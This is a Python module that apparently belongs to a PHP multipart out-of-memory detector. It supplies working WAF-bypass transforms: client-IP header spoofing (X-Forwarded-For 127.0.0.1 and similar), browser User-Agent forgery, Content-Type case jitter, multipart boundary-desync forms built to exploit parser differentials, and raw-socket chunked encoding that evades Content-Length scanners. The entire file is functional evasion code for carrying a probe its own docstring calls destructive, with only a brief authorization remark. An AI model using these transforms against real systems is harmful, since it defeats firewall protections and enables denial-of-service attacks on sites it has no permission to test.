#!/usr/bin/env python3
# INDEX: WAF-evasion request transforms (client-IP/UA spoof, CT jitter, boundary-desync, chunked TE) for the detector | all
"""WAF-bypass request transforms for the black-box detector (stdlib only).

A WafProfile carries a set of request mutations; wrap_http / wrap_http_full
return drop-in replacements for common.http_urllib.http / http_full that apply
them. Transforms are header/transport-level only -- they never rewrite the
multipart body bytes, so the exact OOM-trigger framing the detector relies on
(empty-filename wall, part counts, nested keys) is preserved.

Transforms:
  headers    extra request headers merged into every request (repeatable K:V,
             plus a browser User-Agent and an X-Forwarded-For/X-Real-IP/...
             client-IP spoof for proxy IP-allowlist / rate-limit evasion).
  ct_jitter  randomize the Content-Type token case and append a benign charset
             param (multipart/form-data -> mUltiPart/form-Data; charset=UTF-8),
             preserving ``boundary=`` verbatim. PHP matches the post-reader token
             case-insensitively (SAPI strncasecmp), so parsing is unaffected;
             naive Content-Type signatures are not.
  bnd_desync rewrite the multipart boundary parameter so a WAF's parser diverges
             from PHP's while PHP still parses the body (parser-differential
             evasion; see Table I of arXiv:2503.10846, which bypasses 5 WAFs
             incl. Cloudflare this way, and the Rack dup-boundary CVE class).
             Forms (all verified PHP-safe on 8.4.26): dup (real boundary first +
             a decoy last -> last-wins WAFs grab the decoy), quote (quoted
             boundary -> quote-literal WAFs miss it), space (space before '='),
             combo (all three). PHP is first-wins and strips quotes / trims space
             before '='. RFC 2231 continuation and a space AFTER '=' are excluded:
             PHP does not parse them, so they would break the probe.
  chunked    stream POST bodies with Transfer-Encoding: chunked (no
             Content-Length) over a raw socket, defeating Content-Length body
             scanners and some body-size caps. http scheme only -- https falls
             back to the plain transport.

Spoofed headers lie about the client, not the target; use only where you are
authorized to test (the detector gates its destructive level behind --i-own-this).
"""
from __future__ import annotations

import random
import re
import socket
from urllib.parse import urlsplit

from common import http_raw

# Client-IP headers a reverse proxy / WAF commonly trusts to identify the caller.
_SPOOF_IP_HEADERS = ("X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
                     "X-Client-IP", "X-Remote-IP", "Client-IP")

_DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")


def _kv_pairs(items):
    """Parse ['K: V', 'K:V'] -> {K: V} (first colon splits; both sides trimmed)."""
    out = {}
    for it in items or []:
        if ":" not in it:
            continue
        k, v = it.split(":", 1)
        if k.strip():
            out[k.strip()] = v.strip()
    return out


def _rand_case(s, rng):
    return "".join(c.upper() if (c.isalpha() and rng.random() < 0.5) else c.lower()
                   for c in s)


def _get_ci(h, name):
    for k in h:
        if k.lower() == name.lower():
            return h[k]
    return None


def _set_ci(h, name, value):
    for k in list(h):
        if k.lower() == name.lower():
            h[k] = value
            return
    h[name] = value


def jitter_content_type(ct, rng=None):
    """Case-jitter the media-type token and append `; charset=UTF-8`, keeping the
    rest of the header (notably `boundary=`) verbatim."""
    rng = rng or random.Random()
    head, sep, rest = ct.partition(";")
    out = _rand_case(head.strip(), rng) + (sep + rest if sep else "")
    if "charset=" not in out.lower():
        out += "; charset=UTF-8"
    return out


def extract_boundary(ct):
    """Pull the multipart boundary value out of a Content-Type (first occurrence,
    quotes/whitespace stripped) -- matching PHP's rfc1867 first-wins extraction."""
    m = re.search(r'boundary\s*=\s*"?([^";]+)"?', ct, re.I)
    return m.group(1).strip() if m else None


# Boundary-desync forms, all VERIFIED to keep PHP's rfc1867 parser parsing the
# body (8.4.26 fpm) while diverging a WAF whose multipart parser normalizes
# differently. PHP is first-boundary-wins and strips quotes / trims space before
# '='. Excluded as probe-breaking: RFC 2231 continuation (boundary*0/*1 -- PHP
# does not join it) and a space AFTER '=' (PHP keeps it in the value).
BOUNDARY_DESYNC_FORMS = ("dup", "quote", "space", "combo")


def make_desync_ct(ct, form, rng=None, jitter=False):
    """Rewrite a multipart Content-Type into a boundary-desync form, preserving
    the real boundary the body uses so PHP keeps parsing. `form`:
      dup    real boundary first + a decoy boundary last (beats last-wins WAFs).
      quote  quoted boundary (beats quote-literal WAFs; PHP strips the quotes).
      space  space before '=' (beats strict `boundary=` matchers).
      combo  space + quotes + decoy-last stacked.
    `jitter` also case-folds the media-type token. Returns `ct` unchanged if no
    boundary is present."""
    rng = rng or random.Random()
    bnd = extract_boundary(ct)
    if not bnd:
        return ct
    mt = _rand_case("multipart/form-data", rng) if jitter else "multipart/form-data"
    decoy = "----" + "".join(rng.choice("0123456789abcdef") for _ in range(12))
    if decoy == bnd:
        decoy += "0"
    if form == "quote":
        return '%s; boundary="%s"' % (mt, bnd)
    if form == "space":
        return "%s; boundary =%s" % (mt, bnd)
    if form == "combo":
        return '%s; boundary ="%s"; boundary=%s' % (mt, bnd, decoy)
    return "%s; boundary=%s; boundary=%s" % (mt, bnd, decoy)   # "dup"


class WafProfile:
    """A bundle of request mutations applied to every detector request."""

    def __init__(self, headers=None, ua=None, xff=None, ct_jitter=False,
                 chunked=False, chunk_size=1024, boundary_desync=None, seed=None):
        self.headers = dict(headers or {})
        self.ua = ua
        self.xff = xff
        self.ct_jitter = bool(ct_jitter)
        self.chunked = bool(chunked)
        self.chunk_size = max(1, int(chunk_size))
        self.boundary_desync = boundary_desync or None
        self._rng = random.Random(seed)

    @property
    def enabled(self):
        return bool(self.headers or self.ua or self.xff or self.ct_jitter
                    or self.chunked or self.boundary_desync)

    def summary(self):
        bits = []
        if self.ua:
            bits.append("ua")
        if self.xff:
            bits.append("xff=" + self.xff)
        if self.headers:
            bits.append("+%dhdr" % len(self.headers))
        if self.boundary_desync:
            bits.append("bnd-desync=" + self.boundary_desync)
        if self.ct_jitter:
            bits.append("ct-jitter")
        if self.chunked:
            bits.append("chunked/%d" % self.chunk_size)
        return ",".join(bits) or "none"

    @classmethod
    def from_args(cls, args):
        """Build a profile from the detector's --waf-* flags. --waf-bypass turns
        on the default bundle (browser UA + XFF 127.0.0.1 + ct_jitter); chunked
        stays opt-in via --waf-chunked."""
        bundle = bool(getattr(args, "waf_bypass", False))
        headers = _kv_pairs(getattr(args, "waf_header", None))
        ua = getattr(args, "waf_ua", None)
        if ua is None and bundle:
            ua = _DEFAULT_UA
        xff = getattr(args, "waf_xff", None)
        if xff is None and bundle:
            xff = "127.0.0.1"
        ct_jitter = bool(getattr(args, "waf_ct_jitter", False) or bundle)
        chunked = bool(getattr(args, "waf_chunked", False))
        chunk_size = int(getattr(args, "waf_chunk_size", 1024) or 1024)
        boundary_desync = getattr(args, "waf_boundary_desync", None)
        return cls(headers=headers, ua=ua, xff=xff, ct_jitter=ct_jitter,
                   chunked=chunked, chunk_size=chunk_size,
                   boundary_desync=boundary_desync)

    def apply_headers(self, headers):
        """Return a new header dict with UA/IP-spoof/custom headers merged and,
        when enabled, the Content-Type jittered. Custom --waf-header wins."""
        h = dict(headers or {})
        if self.ua:
            _set_ci(h, "User-Agent", self.ua)
        if self.xff:
            for name in _SPOOF_IP_HEADERS:
                if _get_ci(h, name) is None:
                    h[name] = self.xff
        for k, v in self.headers.items():
            _set_ci(h, k, v)
        if self.ct_jitter or self.boundary_desync:
            ct = _get_ci(h, "Content-Type")
            if ct and "multipart/form-data" in ct.lower():
                if self.boundary_desync:
                    ct = make_desync_ct(ct, self.boundary_desync, self._rng, self.ct_jitter)
                else:
                    ct = jitter_content_type(ct, self._rng)
                _set_ci(h, "Content-Type", ct)
        return h

    def wrap_http(self, http_fn):
        """Drop-in for common.http_urllib.http that applies the profile."""
        if not self.enabled:
            return http_fn

        def _f(url, data=None, headers=None, timeout=180):
            h = self.apply_headers(headers)
            if self.chunked and data is not None and _is_http(url):
                st, _hd, body = chunked_exchange(url, data, h, timeout, self.chunk_size)
                return st, body
            return http_fn(url, data=data, headers=h, timeout=timeout)
        return _f

    def wrap_http_full(self, http_full_fn):
        """Drop-in for common.http_urllib.http_full that applies the profile."""
        if not self.enabled:
            return http_full_fn

        def _f(url, data=None, headers=None, timeout=60):
            h = self.apply_headers(headers)
            if self.chunked and data is not None and _is_http(url):
                return chunked_exchange(url, data, h, timeout, self.chunk_size)
            return http_full_fn(url, data=data, headers=h, timeout=timeout)
        return _f


def _is_http(url):
    return urlsplit(url if "://" in url else "http://" + url).scheme in ("http", "")


def build_chunked_wire(url, data, headers, chunk_size):
    """Build the raw HTTP/1.1 Transfer-Encoding: chunked POST wire bytes.

    Drops any caller Content-Length/Transfer-Encoding/Host/Connection headers and
    re-frames `data` into `chunk_size`-byte chunks. Returns (host, port, wire)."""
    u = urlsplit(url if "://" in url else "http://" + url)
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    hostline = host if port == 80 else "%s:%d" % (host, port)
    skip = {"content-length", "transfer-encoding", "host", "connection"}
    lines = ["POST %s HTTP/1.1" % path, "Host: %s" % hostline]
    for k, v in (headers or {}).items():
        if k.lower() in skip:
            continue
        lines.append("%s: %s" % (k, v))
    lines.append("Transfer-Encoding: chunked")
    lines.append("Connection: close")
    wire = bytearray(("\r\n".join(lines) + "\r\n\r\n").encode("latin1"))
    body = data if isinstance(data, (bytes, bytearray)) else str(data).encode()
    for i in range(0, len(body), chunk_size):
        piece = body[i:i + chunk_size]
        wire += b"%x\r\n" % len(piece) + bytes(piece) + b"\r\n"
    wire += b"0\r\n\r\n"
    return host, port, bytes(wire)


def parse_response(resp):
    """Parse raw HTTP response bytes -> (status, headers_dict, body). Dechunks a
    chunked response body. Empty input -> (None, {}, b"")."""
    if not resp:
        return None, {}, b""
    status = http_raw.status_code(resp)
    i = resp.find(b"\r\n\r\n")
    if i < 0:
        return status, {}, b""
    head = resp[:i].decode("latin1", "replace")
    body = resp[i + 4:]
    hdrs = {}
    for line in head.split("\r\n")[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            hdrs[k.strip()] = v.strip()
    if "chunked" in hdrs.get("Transfer-Encoding", "").lower():
        body = http_raw.dechunk(body)
    return status, hdrs, body


def chunked_exchange(url, data, headers, timeout, chunk_size):
    """Send `data` as a chunked multipart POST over a raw socket and parse the
    response. Returns (status, headers_dict, body); a connect/IO failure or a
    worker that dies mid-stream yields (None, {}, <partial-or-error>)."""
    host, port, wire = build_chunked_wire(url, data, headers, chunk_size)
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except OSError as e:
        return None, {}, str(e).encode()
    resp = b""
    try:
        s.sendall(wire)
        resp = http_raw.recv_all(s, timeout, cap=4 << 20)
    except OSError:
        resp = b""
    finally:
        try:
            s.close()
        except OSError:
            pass
    return parse_response(resp)
